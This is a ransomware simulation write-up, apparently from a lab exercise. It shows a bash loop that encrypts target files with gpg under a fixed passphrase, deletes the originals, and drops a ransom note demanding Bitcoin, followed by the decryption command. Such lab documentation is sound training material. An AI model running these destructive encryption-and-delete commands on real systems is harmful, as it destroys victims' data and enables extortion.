##  Ransomware Simulation (GPG Encryption)

This phase simulates a ransomware attack in which the attacker, after gaining reverse shell access, encrypts target files and demands a ransom.

###  Steps Performed:

1. **Reverse Shell Access**
   - Attacker (192.168.1.30) gained shell access on victim (192.168.1.33) via PHP reverse shell.

2. **Encryption Script Executed**
   - File names: `File1`, `File2`, `File3`
   - Tool: `gpg` (symmetric encryption)
   - Command used:

     ```bash
     gpg --batch --yes --passphrase "ransompass" -c FileX
     ```

   - Files were encrypted to `FileX.gpg` and originals deleted using a script:

     ```bash
     for f in File*; do
       gpg --batch --yes --passphrase "ransompass" -c "$f"
       rm "$f"
     done
     ```

3. **Result**
   - `.gpg` encrypted files created.
   - Original files no longer accessible.
   - Simulates a ransomware attack where only the attacker holds the decryption passphrase.

---

## 📄 Ransom Note Dropped

A ransom message was created on the victim's system:

```bash
echo "Your files have been encrypted. Send 1 BTC to 1FakeAddress. Contact attacker@darkmail.com to receive the decryption key." > README_RESTORE.txt


Files were encrypted from the attacker shell using root privileges.

Victim cannot access the original files unless they obtain the passphrase.

Decryption is possible using:

gpg --batch --yes --passphrase "ransompass" -o File1 -d File1.gpg

